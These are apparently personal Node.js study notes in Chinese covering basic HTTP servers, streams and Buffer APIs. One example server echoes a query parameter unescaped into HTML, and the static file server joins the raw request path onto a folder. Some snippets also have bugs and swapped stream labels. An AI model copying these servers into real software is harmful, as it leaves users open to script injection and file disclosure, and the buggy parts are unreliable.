<pre><code class="language-javascript">var http = require(&apos;http&apos;);
var url = require(&apos;url&apos;);
http.createServer(function (req, res) {
  var urlObj = url.parse(req.url, true);
  var queryObj = urlObj.query;
  res.writeHead(200, {&apos;Content-Type&apos;: &apos;text/html&apos;});
  res.write(queryObj.name);
  res.end();
}).listen(8080);
</code></pre>
<ul>
<li>
<p><a href="https://nodejs.org/en/knowledge/HTTP/clients/how-to-access-query-string-parameters/#parsing-with-querystring">&#x89E3;&#x6790;&#x67E5;&#x8BE2;&#x5B57;&#x7B26;&#x4E32;</a> =&gt; <a href="https://stackoverflow.com/questions/29136374/what-the-difference-between-qs-and-querystring">&#x5BF9;&#x6BD4; qs &#x548C; query-string</a></p>
</li>
<li>
<p>&#x5904;&#x7406; chunk &#x7684; server</p>
</li>
</ul>
<pre><code class="language-javascript">const http = require(&quot;http&quot;);
const port = 8089;
http
  .createServer((req, res) =&gt; {
    let data = &quot;&quot;;
    req.on(&quot;data&quot;, (chunk) =&gt; {
      data += chunk;
    });
    req.on(&quot;end&quot;, function () {
      let method = req.method,
        headers = JSON.stringify(req.headers),
        httpVersion = req.httpVersion,
        requestUrl = req.url;
      res.writeHead(200, { &quot;content-type&quot;: &quot;text/plain;charset=utf-8&quot; });
      let responseData =
        method + &quot;-&quot; + headers + &quot;-&quot; + httpVersion + &quot;-&quot; + requestUrl;
      res.end(responseData);
    });
  })
  .listen(port, () =&gt; {
    console.log(`server is running at http://127.0.0.1:${port}`);
  });
</code></pre>
<ul>
<li>&#x539F;&#x751F; Node &#x6258;&#x7BA1;&#x9759;&#x6001;&#x8D44;&#x6E90; =&gt; index.html</li>
</ul>
<pre><code class="language-javascript">const fs = require(&quot;fs&quot;);
const http = require(&quot;http&quot;);
const path = require(&quot;path&quot;);
const server = http.createServer();
server.on(&quot;request&quot;, (req, res) =&gt; {
  let fpath = &quot;&quot;;
  if (req.url === &quot;/&quot;) {
    fpath = path.join(__dirname, &quot;./clock/index.html&quot;);
  } else {
    fpath = path.join(__dirname, &quot;/clock&quot;, req.url);
  }
  fs.readFile(fpath, &quot;utf8&quot;, (err, dataStr) =&gt; {
    if (err) return res.end(&quot;404 Not found&quot;);
    res.end(dataStr);
  });
});
server.listen(80, () =&gt; {
  console.log(&quot;server running at http://127.0.0.1&quot;);
});
</code></pre>
<h3 id="stream">Stream</h3>
<blockquote>
<p>A stream is an abstract interface for working with streaming data in Node.js. The node:stream module provides an API for implementing the stream interface.</p>
</blockquote>
<p>There are many stream objects provided by Node.js. For instance, a request to an HTTP server and process.stdout are both stream instances.</p>
<p>Streams can be readable, writable, or both. All streams are instances of EventEmitter.</p>
<p>&#x901A;&#x5E38;&#x5F00;&#x53D1;&#x4E2D;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x504F;&#x5E95;&#x5C42;&#x7684;&#x6D41;&#x6A21;&#x5757;&#xFF0C;&#x800C;&#x662F;&#x9009;&#x62E9;&#x5176;&#x7684;&#x4E8C;&#x6B21;&#x5C01;&#x88C5;&#x3002;http &#x4E2D;&#x7684; res &#x548C; req &#x6D41;&#x5BF9;&#x8C61;&#x3002;&#x6587;&#x4EF6;&#x8F6C;&#x5316;&#x6210;&#x6D41;&#x5BF9;&#x8C61; =&gt; fs &#x6A21;&#x5757;&#x7684; createReadStream &#x548C; createWriteStream&#xFF1B;zlib &#x548C; crypto &#x6A21;&#x5757;&#x662F;&#x5BF9;&#x8F6C;&#x5316;&#x6D41;&#x7684;&#x5E94;&#x7528;&#x3002;</p>
<p>stram &#x4E3B;&#x8981;&#x7528;&#x4E8E; IO &#x64CD;&#x4F5C; -&gt; &#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x3001;&#x6587;&#x4EF6;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x7AEF;&#x5230;&#x7AEF;&#x6570;&#x636E;&#x4EA4;&#x6362;</p>
<p>Node &#x4E2D;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x4F20;&#x7EDF;&#x6A21;&#x5F0F;&#x662F;&#x7F13;&#x51B2;&#x6A21;&#x5F0F;&#xFF0C;&#x5373;&#x7A0B;&#x5E8F;&#x5C06;&#x6240;&#x9700;&#x5904;&#x7406;&#x5F97;&#x8D44;&#x6E90;&#x4ECE;&#x78C1;&#x76D8;&#x5168;&#x90E8;&#x52A0;&#x8F7D;&#x5165;&#x5185;&#x5B58;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x5F85;&#x6240;&#x6709;&#x6570;&#x636E;&#x5168;&#x90E8;&#x52A0;&#x8F7D;&#x540E;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x540E;&#x7EED;&#x5904;&#x7406;&#x3002;&#x5728;&#x6D41;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x7A0B;&#x5E8F;&#x53EA;&#x8981;&#x52A0;&#x8F7D;&#x5230;&#x6570;&#x636E;&#x5C31;&#x4F1A;&#x7ACB;&#x5373;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x8D44;&#x6E90;&#x5C06;&#x4F1A;&#x88AB;&#x5207;&#x5757;&#x4F20;&#x9012;&#x7ED9;&#x8C03;&#x7528;&#x65B9;&#x3002;&#x540E;&#x8005;&#x5360;&#x7528;&#x5185;&#x5B58;&#x66F4;&#x5C0F;&#xFF0C;&#x4E14;&#x8C03;&#x7528;&#x7AEF;&#x53EF;&#x80FD;&#x5FEB;&#x5F97;&#x5230;&#x76F8;&#x5E94;&#x3002;</p>
<p>Node &#x4E2D;&#x7684;&#x6D41;&#x6A21;&#x5757;&#x4E3B;&#x8981;&#x7528;&#x4F5C;&#x5411;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x63D0;&#x4F9B;&#x6D41;&#x63A5;&#x53E3;&#x7684; API&#x3002;&#x6D41;&#x5728;&#x7ED3;&#x6784;&#x4E0A;&#x53EF;&#x5206;&#x4E3A;&#x53EF;&#x8BFB;&#x6D41; Writable&#x3001;&#x53EF;&#x5199;&#x6D41; Readabale&#x3001;&#xFF08;&#x53EF;&#x8BFB;&#x53EF;&#x5199;&#xFF09;&#x53CC;&#x5DE5;&#x6D41; Duplex &#x548C;&#x8F6C;&#x6362;&#x6D41; Transform&#x3002;</p>
<p>Readable &#x5B9E;&#x73B0; readable&#x3001;resume&#x3001;error&#x3001;data&#x3001;end&#x3001;close &#x4E8B;&#x4EF6;&#xFF1B;Writable &#x5B9E;&#x73B0; close&#x3001;finish&#x3001;drain&#x3001;error &#x4E8B;&#x4EF6;&#xFF1B;Duplex &#x6D3E;&#x751F; transform &#x548C; passThrough &#x6D41;&#x3002;</p>
<p>&#x6D41;&#x4E4B;&#x95F4;&#x7684;&#x4EA4;&#x4E92;&#x4E0A;&#x5B9E;&#x73B0;&#x4E86; pipe &#x7BA1;&#x9053;</p>
<pre><code class="language-js">/* Readable &#x53EF;&#x8BFB;&#x6D41; */
const { Readable } = require(&quot;stream&quot;);
new Readable({
  highWaterMark: 16 * 1024, // &#x53EF;&#x8BFB;&#x6D41;&#x7F13;&#x51B2;&#x533A;&#x6700;&#x5927;&#x5BB9;&#x91CF;
  encoding: null,
  objectMode: false, // JS &#x5BF9;&#x8C61;&#x89E3;&#x6790;&#x4E3A;&#x53EF;&#x8BFB;&#x6D41; =&gt; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x6D41;&#x5BF9;&#x8C61;&#x53EA;&#x5904;&#x7406;&#x5B57;&#x7B26;&#x4E32;&#x548C; buffer
  read: function () {}, // &#x5C06;&#x6570;&#x636E;&#x63A8;&#x9001;&#x81F3;&#x7F13;&#x51B2;&#x533A; =&gt; &#x5185;&#x90E8;&#x8C03;&#x7528;
});
class myReadableStream extends Readable {
  constructor(options, data) {
    super(options); // options &#x7528;&#x4E8E;&#x521D;&#x59CB;&#x5316;&#x7236;&#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;
    this.data = data;
  }
  _read() {
    // &#x5F80;&#x7F13;&#x51B2;&#x533A;&#x63A8;&#x6570;&#x636E; =&gt; &#x6B64;&#x79C1;&#x6709;&#x65B9;&#x6CD5;&#x4E0D;&#x53EF; static
    this.push(this.data);
    this.push(null); // null =&gt; &#x4FE1;&#x53F7; -&gt; &#x53EF;&#x8BFB;&#x6D41;&#x7ED3;&#x675F;
  }
}

const r = new myReadableStream(
  { encoding: &quot;utf-8&quot; },
  &quot;Readable Stream Test Ok&quot;
);
// r.on(&quot;readable&quot;, () =&gt; { console.log(r.read()); }); // &#x6B64; read &#x662F;&#x5411;&#x7F13;&#x51B2;&#x533A;&#x8BFB;&#x53D6;&#x6570;&#x636E;
// r.on(&quot;readable&quot;, () =&gt; { // &#x975E;&#x6D41;&#x52A8;&#x6A21;&#x5F0F; =&gt; &#x8C03;&#x7528; read() =&gt; &#x81EA;&#x7531;&#x5EA6;&#x9AD8;
//   let chunk;
//   while ((chunk = r.read(1))) {
//     console.log(chunk);
//   }
// });
r.on(&quot;data&quot;, (chunk) =&gt; { console.log(chunk)}); // &#x6D41;&#x52A8;&#x6A21;&#x5F0F;
r.on(&quot;end&quot;, () =&gt; { console.log(&quot;Read Data End&quot;)}); // end &#x4E8B;&#x4EF6; =&gt; &#x76D1;&#x542C;&#x53EF;&#x8BFB;&#x6D41;&#x5B8C;&#x5168;&#x6D88;&#x8D39;&#x540E;&#x6267;&#x884C;&#x56DE;&#x8C03;
r.on(&quot;error&quot;, () =&gt; { console.log(&quot;Read Data Error&quot;)}); // error &#x4E8B;&#x4EF6; =&gt; &#x6355;&#x83B7;&#x53EF;&#x8BFB;&#x6D41;&#x51FA;&#x73B0;&#x7684;&#x9519;&#x8BEF;
</code></pre>
<pre><code class="language-js">/* Writable &#x53EF;&#x5199;&#x6D41; */
const { Writable } = require(&quot;stream&quot;);
const fs = require(&quot;fs&quot;);
const writableTestObj = {
  path: &quot;./writableTestObj.txt&quot;,
  content: &quot;writableTestObj&quot;,
};
class myWritableStream extends Writable {
  constructor(options) {
    super({ ...options, objectMode: true });
  }
  _write(chunk, encoding, cb) {
    fs.writeFile(chunk.path, chunk.content, { encoding }, (err) =&gt; {
      cb();
    });
  }
}
const w = new myWritableStream();
w.on(&quot;finish&quot;, () =&gt; {
  console.log(&quot;DONE&quot;);
});
w.on(&quot;error&quot;, () =&gt; {
  console.log(err);
});
w.write(writableTestObj);
w.end();
</code></pre>
<pre><code class="language-js">/**
 * &#x524D;&#x7AEF;&#x8D44;&#x6E90;&#x4FDD;&#x5B58;&#x670D;&#x52A1;&#x5668;
 * http module =&gt; req &#x53EF;&#x8BFB;&#x6D41;&#x3001;res &#x53EF;&#x5199;&#x6D41;
 */
const http = require(&quot;http&quot;);
const fs = require(&quot;fs&quot;);
const server = http.createServer((req, res) =&gt; {
  const w = fs.createWriteStream(&quot;./w.jpeg&quot;);
  req.on(&quot;data&quot;, (chunk) =&gt; { // &#x53EF;&#x5199;&#x6D41; end &#x4E8B;&#x4EF6;&#x4E0D;&#x80FD;&#x5199;&#x5728; data &#x4E8B;&#x4EF6;&#x4E2D; =&gt; &#x6587;&#x4EF6;&#x4F1A;&#x591A;&#x6B21;&#x89E6;&#x53D1; data &#x4E8B;&#x4EF6;
    w.write(chunk);
  });
  req.on(&quot;end&quot;, () =&gt; {
    w.end();
    res.end(&quot;SAVE SUCCESS&quot;);
  });
  w.on(&quot;error&quot;, (err) =&gt; {
    console.log(err);
    res.end(&quot;SAVE FAILED&quot;);
  });
});
server.listen(3000);
</code></pre>
<p>pipe &#x662F; Node &#x4E3A; Stream &#x5B9E;&#x73B0;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x8FDE;&#x63A5;&#x53EF;&#x8BFB;&#x6D41;&#x4E0E;&#x53EF;&#x5199;&#x6D41; =&gt; &#x53EF;&#x8BFB;&#x6D41;.pipe(&#x53EF;&#x5199;&#x6D41;)&#xFF0C;&#x53EF;&#x8BFB;&#x6D41;&#x6570;&#x636E;&#x81EA;&#x52A8;&#x8FDB;&#x5165;&#x53EF;&#x5199;&#x6D41;&#x3002;&#x6570;&#x636E;&#x6D41;&#x52A8;&#x7531; pipe &#x7BA1;&#x7406;&#xFF0C;&#x65E0;&#x9700;&#x624B;&#x52A8;&#x8C03;&#x7528; read &#x548C; write &#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-js">/**
 * &#x524D;&#x7AEF;&#x8D44;&#x6E90;&#x4FDD;&#x5B58;&#x670D;&#x52A1;&#x5668;
 * http module =&gt; req &#x53EF;&#x8BFB;&#x6D41;&#x3001;res &#x53EF;&#x5199;&#x6D41;
 */
const http = require(&quot;http&quot;);
const fs = require(&quot;fs&quot;);
const { pipeline } = require(&quot;stream&quot;);
const server = http.createServer((req, res) =&gt; {
  const w = fs.createWriteStream(&quot;./w.jpeg&quot;);
  pipeline(req, w, (err) =&gt; {
    console.log(err);
    res.end(&quot;SAVE FAILED&quot;);
  });
  res.end(&quot;SAVE SUCCESS&quot;);
});
server.listen(3000);
</code></pre>
<p>&#x8F6C;&#x6362;&#x6D41;&#x5185;&#x90E8;&#x5206;&#x522B;&#x5B9E;&#x73B0;&#x53EF;&#x5199;&#x7F13;&#x51B2;&#x533A;&#x548C;&#x53EF;&#x8BFB;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x53EF;&#x5199;&#x7F13;&#x51B2;&#x533A;&#x5BF9;&#x5E94;&#x5916;&#x90E8;&#x7684;&#x53EF;&#x8BFB;&#x6D41;&#xFF0C;&#x901A;&#x8FC7; wirte &#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6D41;&#xFF0C;&#x5C06;&#x53EF;&#x8BFB;&#x6D41;&#x6570;&#x636E;&#x5199;&#x5165;&#x5185;&#x90E8;&#x7684;&#x53EF;&#x5199;&#x7F13;&#x51B2;&#x533A;&#xFF1B;&#x8F6C;&#x6362;&#x6D41;&#x7684;&#x53EF;&#x5199;&#x7F13;&#x51B2;&#x533A;&#x5BF9;&#x5E94;&#x5916;&#x90E8;&#x7684;&#x53EF;&#x5199;&#x6D41;&#xFF0C;&#x901A;&#x8FC7;&#x76D1;&#x542C; data &#x4E8B;&#x4EF6;&#xFF0C;&#x53EF;&#x5199;&#x6D41;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x53EF;&#x8BFB;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x5728;&#x8F6C;&#x6362;&#x6D41;&#x5185;&#x90E8;&#x901A;&#x8FC7;&#x79C1;&#x6709;&#x7684; <code>_transform</code> &#x65B9;&#x6CD5;&#x4F20;&#x9012;&#x6570;&#x636E;&#x3002;&#x8F6C;&#x6362;&#x6D41;&#x7684;&#x6838;&#x5FC3;&#x5C31;&#x662F; <code>_transform</code> &#x65B9;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4E2D;&#x53EF;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;&#x8F6C;&#x6362;&#x540E;&#x7684;&#x6570;&#x636E;&#x901A;&#x8FC7; push &#x65B9;&#x6CD5;&#x63A8;&#x9001;&#x5230;&#x53EF;&#x8BFB;&#x7F13;&#x51B2;&#x533A;&#x3002;</p>
<pre><code class="language-js">/* &#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x4E14;&#x5B57;&#x6BCD;&#x5927;&#x5199; */
const {Transform, pipeline} = require(&quot;stream&quot;);
const fs = require(&quot;fs&quot;);
class myStream extends Transform{
  constructor(options){
    super(options)
  }
  _transform(chunk, encoding,cb){
    this.push(chunk.toString().toUpperCase());
    cb();
  }
}
const r = fs.createReadStream(&quot;./r.txt&quot;);
const w = fs.createWriteStream(&quot;./w.txt&quot;);
const t = new myStream();
// r.pipe(t).pipe(w)
pipeline(r, t, w, (err) =&gt; {console.log(err);})
</code></pre>
<p>&#x8F6C;&#x6362;&#x6D41;&#x9664; transform &#x65B9;&#x6CD5;&#x8FD8;&#x6709; flush &#x65B9;&#x6CD5;&#xFF0C;&#x5176;&#x4F1A;&#x5728;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x6D41;&#x7ED3;&#x675F;&#x4E4B;&#x524D;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x8FD9;&#x5C31;&#x63D0;&#x4F9B;&#x4E86;&#x63A5;&#x53E3;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x636E;&#x6D41;&#x7684;&#x5C3E;&#x90E8;&#x5411;&#x53EF;&#x5199;&#x6D41;&#x63A8;&#x9001;&#x989D;&#x5916;&#x6570;&#x636E;&#x3002;</p>
<pre><code class="language-js">/* &#x8FC7;&#x6EE4;&#x6570;&#x636E; =&gt; &#x5C06;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x4E14;&#x8BA1;&#x7B97;&#x901A;&#x8FC7;&#x7387; */
const { Transform, pipeline, Readable } = require(&quot;stream&quot;);
const fs = require(&quot;fs&quot;);
const testArr = [
  { name: &quot;A&quot;, id: 1 },
  { name: &quot;B&quot;, id: 2 },
  { name: &quot;C&quot;, id: 3 },
];
class myStream extends Transform {
  constructor(options) {
    super({ ...options, objectMode: true });
    this.counter = 0;
    this.total = 0;
  }
  _transform(chunk, encoding, cb) {
    this.total += chunk.length; // &#x904D;&#x5386;&#x6570;&#x7EC4;&#x7684;&#x957F;&#x5EA6;
    for (let item of chunk) {
      if (item.id &gt; 1) {
        this.push(JSON.stringify(item));
        this.push(&quot;\n&quot;);
        this.counter++;
      }
    }
    cb();
  }
  _flush(cb) {
    this.push(&quot;---by ok---&quot;);
    this.push(&quot;\n&quot;);
    this.push(`---${this.counter}/${this.total}---`);
    cb();
  }
}

const r = new Readable({
  objectMode: true,
  read() {
    this.push(testArr);
    this.push(null);
  },
});
const t = new myStream();
const w = fs.createWriteStream(&quot;./w.txt&quot;);
pipeline(r, t, w, (err) =&gt; {
  console.log(err);
});
</code></pre>
<h3 id="buffer">Buffer</h3>
<p>&#x7F13;&#x51B2;&#x533A;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x6570;&#x7EC4;&#xFF0C;&#x5176;&#x5143;&#x7D20;&#x4E3A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7684;&#x4E24;&#x4F4D;&#x6570;&#x3002;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x90FD;&#x4F1A;&#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x663E;&#x793A;&#xFF0C;&#x6240;&#x4EE5;&#x5C3D;&#x7BA1;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#xFF0C;&#x663E;&#x793A;&#x7684;&#x5374;&#x8FD8;&#x662F;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x3002;</p>
<p>Buffer &#x521B;&#x5EFA;&#x5185;&#x5B58;&#x4E2D;&#x7A7A;&#x95F4;&#x7684;&#x5143;&#x7D20;&#x8303;&#x56F4;&#x662F; 00 - ff&#xFF0C;&#x6240;&#x4EE5;&#x5B9E;&#x9645;&#x4E0A;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x5C31;&#x8868;&#x793A;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x3002;</p>
<pre><code class="language-js">00-ff =&gt; 0-255 =&gt; 00000000-11111111 =&gt; 8bit =&gt; 1byte
</code></pre>
<p>Buffer &#x7684;&#x5185;&#x5B58;&#x4E0D;&#x662F;&#x901A;&#x8FC7; JS &#x5206;&#x914D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x5E95;&#x5C42;&#x901A;&#x8FC7; C++ &#x7533;&#x8BF7;&#x7684;&#xFF0C;&#x662F;&#x5BF9;&#x5E94; V8 &#x5806;&#x5185;&#x5B58;&#x4E4B;&#x5916;&#x7684;&#x4E00;&#x5757;&#x539F;&#x59CB;&#x5185;&#x5B58;&#x3002;</p>
<p>&#x7F13;&#x51B2;&#x533A;&#x7528;&#x4E8E;&#x64CD;&#x4F5C;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x3002;&#x540E;&#x7AEF;&#x901A;&#x5E38;&#x9700;&#x8981;&#x8BFB;&#x53D6;&#x548C;&#x64CD;&#x4F5C;&#x957F;&#x6587;&#x672C;&#xFF0C;&#x5904;&#x7406;&#x524D;&#x7AEF;&#x4F20;&#x9012;&#x7684;&#x56FE;&#x7247;&#x548C;&#x5927;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x8FD9;&#x4E9B;&#x5BF9;&#x8C61;&#x90FD;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x3002;&#x524D;&#x7AEF;&#x5BF9;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x7684;&#x64CD;&#x4F5C;&#x9700;&#x6C42;&#x4E0D;&#x591A;&#xFF0C;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x4F46;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x4E0D;&#x53EF;&#x53D8;&#x7684;&#xFF0C;&#x6240;&#x6709;&#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x65B0;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x800C;&#x8FD9;&#x79CD;&#x7ED3;&#x679C;&#x5728;&#x8017;&#x65F6;&#x7684;&#x540C;&#x65F6;&#x8FD8;&#x4F1A;&#x5360;&#x7528;&#x5185;&#x5B58;&#x3002;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x50CF;&#x64CD;&#x4F5C;&#x6570;&#x7EC4;&#x822C;&#x7684;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x6E90;&#x3002;</p>
<ul>
<li>Buffer.alloc(size[, fill[, encoding]]) =&gt; &#x8FD4;&#x56DE; Buffer &#x5B9E;&#x4F8B;</li>
</ul>
<p>&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5927;&#x5C0F;&#x4E00;&#x65E6;&#x786E;&#x5B9A;&#x5219;&#x4E0D;&#x80FD;&#x4FEE;&#x6539;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x5BF9;&#x5185;&#x5B58;&#x7684;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#xFF0C;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5206;&#x914D;&#x51FA;&#x8FDE;&#x7EED;&#x7684;&#x957F;&#x5EA6;&#x4F5C;&#x4E3A;&#x786E;&#x5B9A;&#x7684;&#x7A7A;&#x95F4;&#x3002;&#x4E0E;&#x6570;&#x7EC4;&#x4E0D;&#x540C;&#xFF0C;&#x4F46;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x4E0D;&#x8FDE;&#x7EED;&#x4F1A;&#x5BFC;&#x81F4;&#x6027;&#x80FD;&#x8F83;&#x5DEE;&#x3002;</p>
<pre><code class="language-js">const buf1 = Buffer.alloc(10); // &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 10&#x3001;&#x4E14;&#x7528; 0 &#x586B;&#x5145;&#x7684; Buffer
const buf2 = Buffer.alloc(10, 1); // &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 10&#x3001;&#x4E14;&#x7528; 0x1 &#x586B;&#x5145;&#x7684; Buffer 
</code></pre>
<ul>
<li>Buffer.from(?) =&gt; &#x8FD4;&#x56DE; Buffer &#x5B9E;&#x4F8B;</li>
</ul>
<p>Buffer.from(?) &#x548C; Buffer.alloc(size) &#x90FD;&#x53EF;&#x65B0;&#x5EFA; Buffer &#x5B9E;&#x4F8B;&#xFF0C;&#x524D;&#x8005;&#x662F;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x52A8;&#x6001;&#x521D;&#x59CB;&#x5316;&#x3002;</p>
<pre><code class="language-javascript">console.log(Buffer.from(&apos;Hello ok&apos;).length) // &#x5360;&#x7528;&#x5185;&#x5B58;&#x5927;&#x5C0F;;&#x4E00;&#x4E2A;&#x82F1;&#x6587;&#x5360;1&#x5B57;&#x8282; - 8
console.log(Buffer.from(&apos;Hello &#x7D2B;&apos;).length) // &#x5360;&#x7528;&#x5185;&#x5B58;&#x5927;&#x5C0F;;&#x4E00;&#x4E2A;&#x6C49;&#x5B57;&#x5360;3&#x5B57;&#x8282; - 9
</code></pre>
<pre><code class="language-js">const buf4 = Buffer.from([1, 2, 3]); // &#x521B;&#x5EFA;&#x5305;&#x542B; [0x1, 0x2, 0x3] &#x7684; Buffer
console.log(Buffer.from(Buffer.from(&apos;Hello zs&apos;)), Buffer.compare(Buffer.from(&apos;Hello zs&apos;), Buffer.from(Buffer.from(&apos;Hello zs&apos;)))) // &lt;Buffer 48 65 6c 6c 6f 20 7a 73&gt; 0 =&gt; &#x62F7;&#x8D1D;&#x4F20;&#x5165;&#x7684; Buffer &#x5B9E;&#x4F8B;&#x6570;&#x636E;
const buf5 = Buffer.from(&apos;t&#xE9;st&apos;); // &#x521B;&#x5EFA;&#x5305;&#x542B; UTF-8 &#x5B57;&#x8282; [0x74, 0xc3, 0xa9, 0x73, 0x74] &#x7684; Buffer
const buf6 = Buffer.from(&apos;t&#xE9;st&apos;, &apos;latin1&apos;); // &#x521B;&#x5EFA;&#x5305;&#x542B; Latin-1 &#x5B57;&#x8282; [0x74, 0xe9, 0x73, 0x74] &#x7684; Buffer
</code></pre>
<blockquote>
<p>&#x52A8;&#x6001;&#x521D;&#x59CB;&#x5316; =&gt; &#x6570;&#x7EC4;&#x7684;&#x5B9A;&#x4E49;&#x548C;&#x5206;&#x914D;&#x7A7A;&#x95F4;&#x8D4B;&#x503C;&#x7684;&#x64CD;&#x4F5C;&#x5206;&#x5F00;&#x8FDB;&#x884C;&#xFF1B;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316; =&gt; &#x6570;&#x7EC4;&#x5728;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x663E;&#x5F0F;&#x6307;&#x5B9A;&#x6BCF;&#x4E2A;&#x6570;&#x7EC4;&#x5143;&#x7D20;&#x7684;&#x521D;&#x59CB;&#x503C;&#x3002;</p>
</blockquote>
<ul>
<li>Buffer.allocUnsafe(size) =&gt; &#x8FD4;&#x56DE; Buffer &#x5B9E;&#x4F8B;</li>
</ul>
<p>Buffer.allocUnsafe(size) &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x7684; Buffer &#x5B9E;&#x4F8B;,&#x6B64;&#x65B9;&#x6CD5;&#x6BD4;&#x8C03;&#x7528;&#x65E2;&#x5206;&#x914D;&#x7A7A;&#x95F4;&#x53C8;&#x6E05;&#x7A7A;&#x6570;&#x636E;&#x7684; Buffer.alloc() &#x66F4;&#x5FEB;&#x3002;&#x4F46;&#x662F; Buffer &#x5B9E;&#x4F8B;&#x4E0D;&#x4F1A;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5219;&#x53EF;&#x80FD;&#x5305;&#x542B;&#x654F;&#x611F;&#x7684;&#x65E7;&#x6570;&#x636E;,&#x9700;&#x8981;&#x4F7F;&#x7528; fill() &#x6216; write() &#x91CD;&#x5199;&#x3002;</p>
<pre><code class="language-javascript">const buf3 = Buffer.allocUnsafe(10); // &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 10 &#x4E14;&#x672A;&#x521D;&#x59CB;&#x5316;&#x7684; Buffer
</code></pre>
<p>Buffer.allocUnsafeSlow(size) &#x9002;&#x7528;&#x60C5;&#x51B5; =&gt; &#x4E0D;&#x786E;&#x5B9A;&#x7684;&#x65F6;&#x523B;&#x4ECE;&#x6C60;&#x4E2D;&#x4FDD;&#x7559;&#x4E00;&#x5C0F;&#x5757;&#x5185;&#x5B58;</p>
<ul>
<li>
<p>buf.write(string[, offset[, length]][, encoding]) =&gt; &#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x5199;&#x5165; buf</p>
</li>
<li>
<p>buf.toString([encoding[, start[, end]]]) =&gt; &#x5C06; Buffer &#x5B9E;&#x4F8B;&#x89E3;&#x7801;&#x6210;&#x5B57;&#x7B26;&#x4E32;</p>
</li>
</ul>
<h3 id="events">Events</h3>
